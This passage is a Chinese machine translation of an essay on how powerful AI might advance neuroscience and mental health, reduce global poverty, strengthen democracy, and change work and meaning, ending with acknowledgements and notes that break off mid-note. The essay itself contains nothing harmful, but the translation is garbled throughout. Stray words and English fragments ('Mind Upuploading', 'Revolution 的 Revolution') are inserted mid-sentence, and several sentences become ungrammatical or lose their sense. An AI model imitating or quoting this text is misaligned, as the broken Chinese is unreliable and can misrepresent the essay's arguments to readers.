将沿着四条不同的路线加速神经科学的进步，所有这些路线都可以 希望 携手治愈精神疾病，改善功能：√ 传统的分子生物学、化学和遗传学。这本质上是 与第 1 节中的普通生物学故事相同，AI 可能会通过相同的方式加快速度 机制。 有许多药物可以调节神经递质以改变大脑功能，影响 警觉性或感知力、改变情绪等，人工智能可以帮助我们发明更多。人工智能也可能加速对精神疾病遗传基础的研究。√ 精细的神经测量和干预。这是 量 许多单个神经元或神经元回路正在做什么，并进行干预以改变它们的 行为。光遗传学和神经探针是能够进行测量和 对活生物体的干预，以及一些非常先进的方法（如 Molecular Ticker 磁带来读取大量单个神经元的放电模式）也被提出来，并且似乎 原则上是可能的。√ 高级计算神经科学。如上所述，具体的 Insights 和 现代 AI 的格式塔或许可以卓有成效地应用于系统神经科学中的问题，包括揭示真实的 原因 以及精神病或情绪障碍等复杂疾病的动态。√ 行为干预。鉴于重点放在 神经科学的生物学方面，但精神病学和心理学当然已经发展了广泛的 20 世纪行为干预的曲目;按理说 人工智能 也可以加速这些，既可以开发新方法，也可以帮助患者 粘 添加到现有方法中。更广泛地说，“AI 教练”的想法总是帮助你成为最好的 你自己，研究你的互动并帮助你学习更有效， 似乎非常有前途。我猜想，这四种进步途径一起工作，就像身体疾病一样，会是 上 跟踪导致未来 100 年治愈或预防大多数精神疾病，即使 AI 是 不 参与其中，因此可能在 5-10 年 AI 加速的时间内合理地完成。具体来说，我的猜测 在 将发生的事情是这样的：√ 大多数精神疾病或许可以治愈。我不是精神病学专家 疾病 （我在神经科学方面的时间花在构建探针来研究一小群神经元上）但这是我的 猜想像创伤后应激障碍、抑郁症、精神分裂症、成瘾等疾病是可以弄清楚的，并且 通过上述四个方向的某种组合非常有效地治疗。答案很可能 自 是 “something went wrong biochemistry” 的某种组合（尽管它可能非常复杂） 和 “神经网络在高层次上出了点问题”。也就是说，它是一个系统 神经科学问题——尽管这并不能说明行为干预的影响 上面讨论过。用于测量和干预的工具，尤其是对活体人类的测量和干预，似乎是可能的 自 导致快速迭代和进步。√ 非常“结构性”的条件可能更困难，但并非如此 不可能。 有一些 精神病与明显的神经解剖学差异相关的证据 – 一些 精神病患者的大脑区域只是更小或更不发达。人们也认为精神病患者 自 从小就缺乏同理心;无论他们的大脑有什么不同，它可能总是如此 那 道路。某些智力障碍和其他疾病可能也是如此。 重组大脑听起来很难，但这似乎也是一项回报率很高的任务 情报。也许有一些方法可以哄骗成人大脑更早或更可塑 状态，以便对其进行重塑。我非常不确定这怎么可能，但我的直觉是 是 对 AI 可以在这里创造的东西持乐观态度。√ 对精神疾病进行有效的遗传预防似乎是可能的。最精神 疾病 部分 遗传性和全基因组关联研究正在启动 自 在识别相关因素方面获得牵引力，这些因素通常很多。它 将 可能可以通过胚胎筛查来预防大多数这些疾病，类似于 故事 患有身体疾病。一个区别是精神疾病更可能是多基因的 （许多基因都有贡献），因此由于复杂性，在不知不觉中选择 反对与疾病相关的积极特征。然而，奇怪的是，在 最近 年的 GWAS 研究似乎表明，这些相关性可能被夸大了。无论如何，AI 加速 神经科学可以帮助我们弄清楚这些事情。当然，胚胎筛查复杂 性状 引发了许多社会问题，并且会引起争议，尽管我猜大多数 人 将支持筛查严重或使人衰弱的精神疾病。√ 我们不认为是临床疾病的日常问题也将解决了。 我们大多数人都有日常的心理问题，这些问题通常不被认为是上升到的 这 临床疾病的水平。有些人很容易生气，有些人难以集中注意力或正在 经常 昏昏欲睡，有些人感到恐惧或焦虑，或者对变化反应不佳。今天，药物已经存在 帮助 例如警觉性或专注力（咖啡因、莫达非尼、利他林），但与许多其他以前的 地区 可能性可能更大。可能还有更多这样的药物存在，但还没有 发现，也可能有全新的干预方式，例如靶向光 刺激（参见上面的光遗传学）或磁场。考虑到我们在 这 20 世纪的那个调优认知功能和情绪状态，我非常看好 “压缩 21 日”，每个人都可以让他们的大脑表现得更好一点，并拥有更多的 充实的日常体验。√ 人类基线体验可以好得多。更进一步，许多 人 经历过非凡的启示、创意灵感、同情心、 实现超越、爱、美丽或冥想的平静。这些 经验 因人而异，同一个人内部在不同时间差异很大，并且可以 也 有时由各种药物触发（尽管通常有副作用）。所有这些都表明 那 “可能体验的空间”非常广泛，而且很大一部分 人民 生活可以由这些非凡的时刻组成。也可能可以提高 各种 全面的认知功能。这也许是神经科学版本的“生物 自由“或”延长寿命”。一个经常出现在科幻小说中对 AI 的描述中，但我故意没有讨论的话题 这里是“Mind Upuploading”，即捕捉人脑的模式和动态的想法，以及 在 Software 中实例化它们。这个主题本身可以成为一篇文章的主题，但是 足够 可以说，虽然我认为上传几乎肯定是可能的 原则上，它在实践中面临着重大的技术和社会挑战，即使 强 人工智能，这可能使其超出了我们正在讨论的 5-10 年窗口。总之，AI 加速的神经科学可能会极大地改善甚至治愈 最 精神疾病以及大大扩展了“认知和精神自由”和人类认知和 情感能力。它将与身体健康的改善一样彻底 在 上一节。也许世界在外面不会有明显的差异，但世界 如 人类体验将是一个更好、更人性化的地方，也是一个提供 更大的自我实现机会。我还怀疑心理健康的改善会 改善 许多其他社会问题，包括那些看起来是政治或经济的问题。3. 经济发展与贫困前两节是关于开发治愈疾病和改进的新技术 这 人类生活质量。然而，从人道主义的角度来看，一个明显的问题是：“将 每个人 都 可以使用这些技术吗？开发治愈疾病的方法是一回事，根除疾病是另一回事 这 世界。更广泛地说，许多现有的卫生干预措施尚未在任何地方得到应用 世界，就此而言，一般的（非健康）技术改进也是如此。 另一种说法是，世界许多地方的生活水平仍然非常高 差：人均 GDP 为 撒哈拉以南非洲为 ~2,000 美元，而美国为 ~75,000 美元。如果 AI 进一步增加 发达国家的经济增长和生活质量，而对 发展 世界，我们应该将其视为可怕的道德失败和对真正人道主义的污点 前两个部分的胜利。理想情况下，强大的人工智能应该帮助发展中国家赶上 直到发达国家，即使它彻底改变了后者。我对 AI 能够解决不平等和经济增长问题的信心不如我对它能发明的信心 基础技术，因为技术对智能的回报如此明显 （包括 绕过复杂性和缺乏数据的能力），而经济涉及大量 来自人类的约束，以及大量的内在复杂性。我有点怀疑 那 人工智能可以解决著名的“社会主义计算问题”23而且我认为政府不会（或应该）交出他们的 经济政策分配给这样的实体，即使它可以这样做。还有一些问题，比如 how how 说服 人们接受有效但可能会怀疑的治疗方法。发展中国家面临的挑战因普遍的腐败而变得更加复杂 私营和公共部门。腐败造成了一个恶性循环：它加剧了贫困，并且 贫困 回合滋生更多的腐败。人工智能驱动的经济发展计划需要考虑腐败问题， 薄弱的机构，以及其他非常人性化的挑战。尽管如此，我确实看到了乐观的重要理由。疾病已被根除，许多 国家已经从穷人变成了富人，很明显，这些任务所涉及的决策表现出来 高 回归智能（尽管人类的限制和复杂性）。因此，AI 可能会做到这一点 比他们目前所做的要好。也可能有针对性的干预措施来绕过 人类限制，AI 可以关注。但更重要的是，我们必须尝试。Both AI 公司 而发达国家的政策制定者需要尽自己的一份力量，确保发展中国家不会 被遗漏;道德要求太大了。所以在本节中，我将继续乐观 案例，但请记住，成功并不能保证，而是取决于我们的集体努力。下面我对发展中国家 5 到 10 年的情况进行一些猜测 开发强大的 AI 后：√ 健康干预措施的分布。我可能最擅长的地区 乐观的 正在世界各地分发健康干预措施。疾病实际上已经 根除 自上而下的运动：天花在 1970 年代被完全消灭，脊髓灰质炎和麦地那龙线虫几乎被消灭 每年根除少于 100 例。数学上复杂的流行病学模型发挥着积极的作用 角色 在疾病根除运动中，似乎很可能有空间 比人类更聪明 AI 系统比人类做得更好。配送物流大概可以 也 得到极大的优化。作为 GiveWell 的早期捐助者，我学到的一件事是，一些健康慈善机构 比其他人更有效; 希望 AI 加速的努力会更加有效。此外，一些 生物 进步实际上使配送物流变得更加容易：例如，疟疾已经 难以根除，因为每次感染疾病都需要治疗;一个 疫苗 只需接种一次使物流变得更加简单（并且此类疫苗 疟疾实际上是 目前正在开发中）。甚至更简单的分发机制也是可能的：一些 疾病 原则上可以通过针对它们的动物载体来根除，例如释放 蚊子感染了一种细菌，这种细菌会阻止它们携带疾病的能力（然后感染所有其他细菌 蚊子）或简单地使用基因驱动器来消灭蚊子。这需要一个或多个 集中行动，而不是必须单独治疗数百万人的协调活动。 总的来说，我认为 5-10 年是一个合理的时间表，因为其中很大一部分（可能是 50%）。 AI 驱动型 健康益处甚至可以传播到世界上最贫穷的国家。一个好的目标可能是 为 发展中国家 5-10 年后，强大的 AI 至少比 这 发达国家是今天的，即使它继续落后于发达国家。完成 这 当然，这需要在全球健康、慈善事业、政治宣传和 多 其他努力，AI 开发人员和政策制定者都应该提供帮助。√ 经济增长。发展中国家能否迅速赶上发达国家 世界 不仅在健康方面，而且在经济方面？这有一些先例：在 在 20 世纪的最后几十年，一些东亚经济体实现了持续 ~10% 的年度实际 GDP 成长 率，使他们能够赶上发达国家。人类经济规划者制定了 导致这一成功的决策不是通过直接控制整个经济体，而是通过拉动 一个 很少有关键杠杆（例如出口导向型增长的产业政策，以及抵制诱惑 自 依赖自然资源财富）;“人工智能财长和央行行长” 可以复制或超过这 10% 的成就。一个重要的问题是 如何获得 发展 世界各国政府在尊重自决原则的同时采用它们——有些政府可能会 对此充满热情，但其他人可能会持怀疑态度。从乐观的一面来看，许多 这 前一个要点中的健康干预措施可能会有机地增加经济 生长：根除艾滋病/疟疾/寄生虫将对 生产力 更不用说一些神经科学干预措施（例如 改进 情绪和焦点）在发达国家和发展中国家都会如此。最后，非健康 AI 加速技术（例如能源技术、运输无人机、改进的建筑 材料 更好的物流和配送，等等）可能会自然地渗透到世界;为 例 甚至手机也通过市场机制迅速渗透到撒哈拉以南非洲地区，而无需 慈善工作。从更消极的一面来看，虽然 AI 和自动化有很多潜力 好处，但它们也对经济发展构成了挑战，特别是对 尚未工业化。寻找确保这些国家仍能发展和改进的方法 在日益自动化的时代，他们的经济对经济学家来说是一个重要的挑战，并且 政策制定者需要解决。总的来说，一个梦想的场景——也许是一个目标——将是每年 20% 国内生产总值 增长率，其中 10% 来自人工智能支持的经济决策，以及 这 AI 加速技术的自然传播，包括但不限于健康。如果实现， 这将使撒哈拉以南非洲在 5-10 年内达到中国目前的人均 GDP，而 将其他大部分发展中国家提高到高于当前美国 GDP 的水平。 再 这是一个梦想的场景，而不是默认发生的事情：这是我们所有人都必须努力的事情 一起 使可能性更大。√ 粮食安全24.作物技术的进步 肥料和 杀虫剂、更高的自动化和更高效的土地利用大大提高了整个 第 20 名 世纪，使数百万人免于饥饿。基因工程目前正在进一步改善许多作物。寻找更多方法 做 这以及提高农业供应链的效率，可以给我们带来 AI 驱动型 第二个果岭 Revolution 的 Revolution 合作，帮助缩小发展中国家和发达国家之间的差距。√ 减缓气候变化。气候变化将在 这 发展中国家，阻碍其发展。我们可以预期 AI 将导致 减缓或防止气候变化、大气碳去除和 将清洁能源技术转化为实验室培育肉类，减少我们对碳密集型工厂的依赖 农业。当然，如上所述，技术并不是限制进步的唯一因素 气候变化——与本文讨论的所有其他问题一样，人类社会因素 是 重要。但是，我们有充分的理由认为，人工智能增强的研究将为我们提供以下方法： 做 缓解气候变化的成本和破坏性大大降低，使许多反对意见变得毫无意义 和 让发展中国家自由地取得更大的经济进步。√ 国家内部的不平等。我主要谈到了全球不平等 现象（我确实认为这是它最重要的表现），但当然也有不平等 存在于国家/地区内。采用先进的健康干预措施，尤其是激进的 增加 在寿命或认知增强药物中，肯定会有合理的担忧，这些 技术“只为富人服务”。我对国内不平等更加乐观 尤其是在发达国家，原因有两个。首先，市场在 发达 世界，并且市场通常擅长降低高价值技术的成本 时间25.二、发达 世界 政治机构对其公民的反应更迅速，并且具有更强的国家能力 执行普遍接入计划——我希望公民要求获得如此 从根本上改善生活质量。当然，这样的要求并不是预先确定的 succeed 和 这是另一个我们共同必须尽我们所能确保公平社会的地方。 有 一个单独的问题，即财富不平等（与获得财富的机会不平等相反 拯救生命 和增强生活的技术），这似乎更难，我在第 5 节中对此进行了讨论。√ 选择退出问题。发达国家和发展中国家都关心一个问题 是 选择退出 AI 支持的福利（类似于反疫苗运动，或 卢德分子 更普遍的动作）。最终可能会出现不良的反馈循环，例如， 最不能做出正确决策的人选择退出能够改进的技术 他们 决策能力，导致差距不断扩大，甚至创造了一个反乌托邦 underclass 的 democracy，我将在下一节中进一步讨论这个话题）。这将再次将 一个 对 AI 的积极进步的道德污点。这是一个很难解决的问题，因为我认为 是的 从道德上讲，胁迫人们是可以的，但我们至少可以尝试提高人们的科学性 理解——也许 AI 本身可以帮助我们解决这个问题。一个充满希望的迹象是，从历史上看 反技术运动与其说是咬人，不如说是吠叫：对现代技术的抨击是 受欢迎，但大多数人最终都会采用它，至少在个人选择的问题上是这样。 个人倾向于采用大多数健康和消费技术，而 真正 与核电一样，受阻往往是集体政治决策。总的来说，我对迅速将人工智能的生物学进步带给发展中的人们持乐观态度 世界。尽管没有信心，但我对 AI 也可以实现前所未有的经济增长充满希望 率 并允许发展中国家至少超过发达国家现在的水平。我很担心 关于发达国家和发展中国家的“选择退出”问题，但怀疑它会 彼得 随着时间的推移，AI 可以帮助加速这一过程。这不会是一个完美的世界，那些 谁 落后不会完全赶上，至少在最初几年不会。但随着我们 部分，我们或许能够让事情朝着正确的方向快速发展。如果我们这样做，我们可以在 至少是我们欠每个人的尊严和平等承诺的首付款 地球。4. 和平与治理假设前三个部分中的一切都很顺利：疾病、贫困和不平等 显着降低，人类体验的基线大幅提高。它没有 跟随 人类苦难的所有主要原因都得到解决。人类仍然对彼此构成威胁。尽管技术进步和经济发展的趋势导致 民主与和平，这是一个非常松散的趋势，经常（和最近）倒退。在 20 世纪初，人们认为他们已经将 战争 在他们身后;然后发生了两次世界大战。30年前，弗朗西斯·福山（Francis Fukuyama）写道：“终结 之 历史“和自由民主的最终胜利;这还没有发生。二十年 ago 美国 政策制定者认为，与中国的自由贸易将导致它随着变得更富裕而实现自由化; 那 很多事情都没有发生，我们现在似乎正朝着 一个 与复兴的威权主义集团的第二次冷战。而合理的理论表明 互联网技术实际上可能有利于威权主义，而不是最初认为的民主 （例如，在“阿拉伯之春”时期）。尝试了解 AI 的强大功能似乎很重要 与和平、民主和自由等问题相交。不幸的是，我认为没有充分的理由相信 AI 会优先或结构性地进步 民主 以及和平，就像我认为它将在结构上促进人类健康并缓解 贫困。 人类冲突是对抗性的，人工智能原则上可以帮助“好人”和“坏人”。 如果 任何事情，一些结构性因素似乎令人担忧：人工智能似乎可能会实现更好的宣传 和 监控，这两者都是独裁者工具包中的主要工具。因此，这取决于我们个人 演员 让事情朝着正确的方向倾斜：如果我们希望 AI 有利于民主和个人权利，我们 是 将不得不为那个结果而战。我对此的感受甚至比我对这件事的感受还要强烈 国际不平等：自由民主和政治稳定的胜利得不到保证，甚至可能不可能，这需要我们所有人做出巨大的牺牲和承诺 部分，就像过去经常发生的那样。我认为这个问题有两个部分：国际冲突和 国家。 在国际方面，民主国家在世界上占据上风似乎非常重要 创建强大 AI 的阶段。人工智能驱动的威权主义似乎太可怕了，无法想象，所以 民主国家需要能够设定将强大的 AI 引入世界的条件，这两者都是 避免被威权主义者压倒，并防止威权主义者内部的人权侵犯 国家。我目前猜测最好的方法是通过“协约策略”26，民主国家联盟寻求 自 通过保护其供应链，在强大的 AI 上获得明显的优势（即使只是暂时的）， 缩放 快速，并阻止或延迟对手对芯片和 半导体设备。这个联盟一方面将利用人工智能来实现强大的军事力量 优势 （大棒），同时提供分配强大 AI 的好处（胡萝卜） 更改为 越来越广泛的国家集团，以换取支持联盟的战略 民主（这有点类似于“原子促进和平”）。该联盟的目标是获得更多和 更多 孤立我们最糟糕的对手，并最终将他们置于 是 最好与世界其他地区讨价还价：放弃与民主国家竞争 次序 获得所有好处，而不是与更强大的敌人作战。如果我们能做到这一切，我们将拥有一个民主国家在世界舞台上发挥领导作用并拥有 避免被独裁政权破坏、征服或破坏的经济和军事实力， 和 或许能够将他们的 AI 优势转化为持久的优势。这可能会乐观地导致 自 一个“永恒的 1991”——一个民主国家占上风、福山梦想得以实现的世界。 同样，这将非常难以实现，尤其需要密切合作 之间 私营 AI 公司和民主政府，以及关于 胡萝卜加大棒之间的平衡。即使一切顺利，也留下了每个国家内部民主与专制之间斗争的问题。显然很难预测这里会发生什么，但我确实有 一些 乐观地认为，鉴于民主国家控制着最强大的 AI 的全球环境，那么 AI 实际上可能在结构上有利于任何地方的民主。特别是，在此 环境 民主政府可以利用其卓越的 AI 来赢得信息战：他们可以反击 影响 和专制政权的宣传操作，甚至可能能够创造一个全球自由的信息 环境，以专制政体缺乏的方式提供信息和 AI 服务渠道 阻止或监控的技术能力。可能没有必要进行宣传，只需 打击恶意攻击并解锁信息自由流动。虽然不是立即的，但 a 级别 像这样的竞争环境很有可能逐渐使全球治理向 民主 有几个原因。首先，在所有条件相同的情况下，第 1-3 节中生活质量的提高应该促进民主： 从历史上看，他们至少在某种程度上是这样。特别是我期望在精神上有所改善 健康 福祉和增加民主的教育，因为这三者都与对威权领导人的支持呈负相关。一般来说，人们希望 更多 当他们的其他需求得到满足时，他们就会自我表达，而民主是 自我表达。相反，威权主义在恐惧和怨恨中蓬勃发展。其次，只要 这 威权主义者无法审查它。未经审查的 AI 还可以为个人带来强大的工具 破坏专制政府。专制政府通过剥夺人们某种种类的生存 之 常识，让他们无法意识到“皇帝没衣服”。例如 Srđa 波波维奇曾帮助推翻塞尔维亚的米洛舍维奇政府，他撰写了大量文章 大约 在心理上剥夺威权者权力、打破魔咒和 集结支持反对独裁者。波波维奇的超人般有效的 AI 版本（其技能 似乎 就像他们有很高的情报回报一样）放在每个人的口袋里，独裁者无能为力 自 阻止或审查，可能会在世界各地的持不同政见者和改革者背后掀起一股风。自 说 同样，这将是一场漫长而持久的战斗，胜利是不确定的，但如果我们 设计 并以正确的方式构建 AI，这至少可能是一场无处不在的自由倡导者的战斗 有 一个优势。与神经科学和生物学一样，我们也可以问事情如何“比正常情况更好”——而不仅仅是 如何 避免专制，但如何使民主国家比今天更好。即使在民主国家内部， 不公正的事情一直在发生。法治社会向公民承诺，每个人 在法律面前是平等的，每个人都有权享有基本人权，但显然人们确实如此 不 在实践中始终获得这些权利。这个承诺甚至部分实现，使它 值得骄傲的是，但 AI 能帮助我们做得更好吗？例如，人工智能能否通过更多地做出决策和流程来改善我们的法律和司法系统 不偏不倚？今天，人们在法律或司法背景下最担心人工智能系统会成为歧视的原因，这些担忧很重要，也需要 是 被防守。与此同时，民主的活力取决于对新技术的利用 自 改善民主制度，而不仅仅是应对风险。真正成熟和成功 AI 的实施有可能减少偏见，对每个人都更公平。几个世纪以来，法律制度一直面临着法律旨在保持公正的困境，但事实并非如此 本质上 主观的，因此必须由有偏见的人来解释。试图使法律完全机械化 没有 之所以有效，是因为现实世界是混乱的，并且不能总是用数学公式来捕获。 相反 法律制度依赖于众所周知的不精确的标准，例如“残酷和 异常 惩罚“或”完全没有挽回社会重要性“，人类则认为 interpret 和 通常以表现出偏见、偏袒或武断的方式这样做。“智能合约” 加密货币并没有彻底改变法律，因为普通代码不够聪明，无法裁决 都 那么多的兴趣。但 AI 可能足够聪明：它是第一个能够 以可重复和机械的方式做出广泛、模糊的判断。我并不是说我们真的要用 AI 系统取代裁判，而是 公平 能够理解和处理混乱的现实世界情况 有 对法律和司法的一些严肃的积极应用。至少，这样的系统可以工作 与人类一起作为决策的辅助工具。透明度在任何此类系统中都很重要， 以及 可以想象，成熟的人工智能科学可以提供它：此类系统的训练过程可以是 经过广泛研究和先进 可解释性技术可用于查看最终模型的内部并对其进行评估 隐藏 偏见，以一种人类根本不可能的方式。此类 AI 工具也可用于 监控 在司法或警察背景下侵犯基本权利，使宪法更加 自我强化。同样，人工智能可用于汇总意见并推动公民之间的共识。 解决冲突、寻找共同点和寻求妥协。这方面的一些早期想法 方向 已经由计算 民主 项目，包括与 Anthropic 的合作。更明智、更深思熟虑的公民 愿意 显然加强了民主制度。AI 也有一个明显的机会来帮助提供政府服务，例如 健康 福利或社会服务——原则上每个人都可以获得，但在实践中往往是 严重 缺乏，而且在某些地方比其他地方更糟糕。这包括医疗服务、DMV、税收、社会 安全性、建筑规范执行等。拥有一个非常有思想和见多识广的 AI，他的工作 是 以您可以理解的方式为您提供政府依法有权获得的一切 - 以及谁 还可以帮助您遵守经常令人困惑的政府规则 — 这将是一件大事。递增状态 能力既有助于兑现法律面前人人平等的承诺，又加强了对 民主治理。服务实施不善是目前对 政府27.所有这些都是有点模糊的想法，正如我在本节开头所说，我不是 几乎一样 对它们的可行性充满信心，因为我对生物学、神经科学和贫困的进步充满信心 减轻。他们可能是不切实际的乌托邦。但重要的是要有一个雄心勃勃的 愿景，愿意有远大的梦想并尝试。人工智能作为自由保障者的愿景， 个人权利和法律面前人人平等的愿景太强大了，不能不为之奋斗。第 21 名 世纪 人工智能驱动的政体既可以成为个人自由的更有力保护者，也可以成为希望的灯塔 那 有助于使自由民主成为全世界都希望采用的政府形式。5. 工作和意义即使前四节中的一切进展顺利——我们不仅减轻了疾病、贫困和不平等，而且自由民主成为了政府的主导形式，现有的自由民主国家也成为了更好的版本——至少还有一个重要问题仍然存在。有人可能会反对：“我们生活在一个技术先进、公平体面的世界里，这太棒了”，“但随着人工智能无所不能，人类将如何有意义？就此而言，他们将如何在经济上生存？”。我认为这个问题比其他问题更难。我并不是说我对它的悲观程度一定比对其他问题的悲观程度高（尽管我确实看到了挑战）。我的意思是，它更模糊，更难提前预测，因为它涉及到关于社会如何组织的宏观问题，这些问题往往只会随着时间的推移以分散的方式自行解决。例如，历史上的狩猎采集社会可能会认为，如果没有狩猎和各种与狩猎相关的宗教仪式，生活就没有意义，并且会认为我们营养丰富的技术社会没有目的。他们可能也不了解我们的经济如何为每个人提供服务，或者人们在机械化社会中可以有效地发挥什么作用。然而，至少有几句话是值得说的，同时要记住，这一节的简短根本不应被视为我不认真对待这些问题的标志——相反，这是缺乏明确答案的标志。关于意义的问题，我认为，仅仅因为人工智能可以做得更好，就认为你承担的任务毫无意义，这很可能是一个错误。大多数人在任何事情上都不是世界上最好的，这似乎并没有特别困扰他们。当然，今天他们仍然可以通过比较优势做出贡献，并可能从他们产生的经济价值中获得意义，但人们也非常喜欢不产生经济价值的活动。我花了很多时间玩电子游戏、游泳、在外面散步、和朋友聊天，所有这些都没有产生任何经济价值。我可能会花一天时间试着在电子游戏上做得更好，或者更快地骑自行车上山，对我来说，某个地方的人在这些方面做得更好并不重要。无论如何，我认为意义主要来自人际关系和联系，而不是经济劳动。人们确实想要一种成就感，甚至是一种竞争感，在后人工智能时代，完全有可能花费数年时间，用复杂的策略尝试一些非常困难的任务，就像今天人们开始研究项目、试图成为好莱坞演员或成立公司时所做的那样。在我看来，（a）某个地方的人工智能原则上可以更好地完成这项任务，以及（b）这项任务不再是全球经济中经济回报的要素，这些事实似乎并不重要。在我看来，经济部分实际上比意义部分更难。本节中的“经济”是指大多数或所有人可能无法为足够先进的人工智能驱动经济做出有意义的贡献的问题。这是一个比单独的不平等问题更宏观的问题，特别是我在第3节中讨论的获得新技术的不平等。首先，在短期内，我同意这样的观点，即比较优势将继续保持人类的相关性，实际上会提高他们的生产力，甚至在某些方面可能会在人类之间创造公平的竞争环境。只要人工智能只在90%的特定工作中表现更好，剩下的10%将导致人类变得高度杠杆化，增加薪酬，实际上创造了一系列新的人类工作，补充和放大了人工智能的优势，这样“10%”就会扩大到继续雇佣几乎所有人。事实上，即使人工智能可以比人类做得更好，但在某些任务上仍然效率低下或成本高昂，或者如果人类和人工智能的资源投入有意义地不同，那么比较优势的逻辑仍然适用。人类可能在相当长的一段时间内保持相对（甚至绝对）优势的一个领域是物质世界。因此，我认为人类经济可能会继续有意义，甚至在我们达到“数据中心天才之国”的时候。然而，我确实认为，从长远来看，人工智能将变得如此广泛有效和廉价，以至于这将不再适用。到那时，我们目前的经济结构将不再有意义，需要就如何组织经济进行更广泛的社会对话。虽然这听起来可能很疯狂，但事实是，文明在过去成功地经历了重大的经济转变：从狩猎采集到农业，从农业到封建主义，从封建主义到工业化。我怀疑需要一些新的、更奇怪的东西，而这是今天没有人做得很好的事情。它可以像为每个人提供大量的普遍基本收入一样简单，尽管我怀疑这只是解决方案的一小部分。这可能是人工智能系统的资本主义经济，然后根据人工智能系统认为对人类有意义的奖励的一些二级经济（基于最终从人类价值观中得出的一些判断）向人类提供资源（数量巨大，因为整体经济蛋糕将是巨大的）。也许经济运行在Whuffie点上。或者，人类终究会继续在经济上具有价值，在某种程度上，这是通常的经济模型所没有预料到的。所有这些解决方案都有很多可能的问题，如果没有大量的迭代和实验，就不可能知道它们是否有意义。与其他一些挑战一样，我们可能不得不在这里争取一个好的结果：剥削或反乌托邦的方向显然也是可能的，必须加以阻止。关于这些问题，我们可以写得更多，我希望以后能这样做。盘点通过上述各种主题，我试图描绘一个世界的愿景，如果人工智能一切顺利，这个世界是合理的，而且比今天的世界要好得多。我不知道这个世界是否现实，即使现实，也离不开许多勇敢和敬业的人的巨大努力和奋斗。每个人（包括人工智能公司！）都需要尽自己的一份力量来防范风险并充分实现收益。但这是一个值得为之奋斗的世界。如果这一切真的发生在5到10年内——大多数疾病的战胜、生物和认知自由的增长、数十亿人摆脱贫困以分享新技术、自由民主和人权的复兴——我怀疑每个观看它的人都会对它对他们的影响感到惊讶。我并不是说个人从所有新技术中受益的经历，尽管这肯定会令人惊叹。我的意思是，看着一套长期以来的理想同时在我们面前实现的经历。我想很多人会被它感动得流下眼泪。在写这篇文章的过程中，我注意到了一种有趣的张力。从某种意义上说，这里提出的愿景是极其激进的：这不是几乎任何人都期望在未来十年发生的事情，而且可能会让许多人觉得这是一种荒谬的幻想。有些人甚至可能不认为这是可取的；它体现了并非所有人都会认同的价值观和政治选择。但与此同时，它也有一些显而易见的东西——一些过度确定的东西，仿佛许多不同的设想美好世界的尝试不可避免地会大致导致这种情况。在伊恩·M·班克斯（Iain M.Banks）的《游戏玩家29》（The Player of Games29）中，主角是一个名为“文化”（Culture）的社会的成员，这个社会的原则与我在这里阐述的原则没有什么不同，他来到了一个专制的军国主义帝国，在这个帝国里，领导力是由复杂的战斗游戏中的竞争决定的。然而，游戏非常复杂，玩家在游戏中的策略往往反映了他们自己的政治和哲学观点。主角在游戏中成功击败了皇帝，表明他的价值观（文化的价值观）即使在一个基于无情竞争和适者生存的社会设计的游戏中也代表了一种获胜的策略。斯科特·亚历山大（Scott Alexander）的一篇著名文章也有同样的论点——竞争会弄巧成拙，往往会导致一个基于同情与合作的社会。“道德宇宙的弧线”是另一个类似的概念。我认为文化的价值观是一种成功的策略，因为它们是一百万个具有明确道德力量的小决定的总和，往往会把每个人拉到同一边。人类对公平、合作、好奇心和自主性的基本直觉很难反驳，而且是以一种我们更具破坏性的冲动通常不会累积的方式累积的。如果我们能预防疾病，很容易认为儿童不应该死于疾病，也很容易认为每个人的孩子都应该平等地享有这一权利。从那里不难看出，我们应该团结起来，运用我们的智慧来实现这一结果。很少有人不同意人们应该因为不必要地攻击或伤害他人而受到惩罚，从那以后，惩罚应该在人与人之间保持一致和系统的想法并没有太大的飞跃。同样直观的是，人们应该对自己的生活和选择拥有自主权和责任。这些简单的直觉，如果得到合乎逻辑的结论，最终会导致法治、民主和启蒙价值观。如果不是不可避免的，那么至少从统计趋势来看，这就是人类已经走向的方向。人工智能只是提供了一个机会，让我们更快地到达那里——让逻辑更加清晰，目的地更加明确。然而，它是一种超越美的东西。我们有机会在实现这一目标方面发挥一些小作用。感谢 Kevin Esvelt、Parag Mallick、Stuart Ritchie、Matt Yglesias、Erik Brynjolfsson、Jim 麦克拉夫， Allan Dafoe 和 Anthropic 的许多人审阅了这篇文章的草稿。感谢 2024 年诺贝尔化学奖获得者，感谢他们一路为我们指明了方向。备注1https://allpoetry.com/All-Watched-Over-By-Machines-Of-Loving-Grace ↩阿拉伯数字我确实预计少数人的反应会是“这很漂亮 驯服”。 我认为这些人需要，用 Twitter 的话来说，“摸草”。但更重要的是， 驯服 从社会的角度来看是好的。我认为人们能做出的改变是有限的 处理 我所描述的速度可能已经接近社会所能达到的极限 吸收时不会有极端的湍流。↩3我发现 AGI 是一个不精确的术语，它收集了很多科幻包袱 和 大肆宣传。我更喜欢“强大的 AI”或“专家级的科学与工程”，它们能说什么 我 没有炒作的意思。↩4在这篇文章中，我用“智能”来指代一般的问题解决方式 功能可以是 应用于不同的领域。这包括推理、学习、计划、 和 创造力。虽然我在这篇文章中用“智能”作为简写，但我承认 该 智能的本质是认知科学和 AI 研究中一个复杂且有争议的话题。 一些 研究人员认为，智能不是一个单一的、统一的概念，而是一个集合 之 独立的认知能力。其他人则认为智力有一个普遍的因素 （克 因素）支持各种认知技能。这是另一次的辩论。↩5这大约是 AI 系统的当前速度——例如，它们可以读取 页面文本，并在大约 20 秒内编写一页文本，即 人类做这些事情的速度是人类的 10-100 倍。随着时间的推移，较大的模型往往 做 这种速度较慢但功能更强大的芯片往往会使其更快;迄今为止，这两种效果 大致抵消了。↩6这似乎是一个稻草人立场，但像 Tyler Cowen 和 Matt Yglesias 这样谨慎的思考者已经将其作为一个严重的问题提出来（尽管我 不要 认为他们完全持有观点），我不认为这很疯狂。↩7据我所知，最接近解决这个问题的经济学著作是 工作 “通用技术”和“无形资产” 投资“的服务 作为通用技术的补充。↩8这种学习可以包括临时学习、上下文学习或传统学习 训练;两者都将受到物理世界的速率限制。↩9在混沌系统中，小误差会随着时间的推移呈指数级复合，因此 甚至 计算能力的巨大增加只会导致多远的微小改进 提前 这是可以预测的，而在实践中，测量误差可能会进一步降低这一点。↩10另一个因素当然是强大的 AI 本身有可能被使用 自 创建更强大的 AI。我的假设是，这可能会（事实上，可能会） 发生，但它的效果将比您想象的要小，正是因为 这 “降低智力的边际回报率”在这里讨论。换句话说，AI 将 继续快速变得更聪明，但其效果最终会受到 非智力因素，分析这些因素对 AI 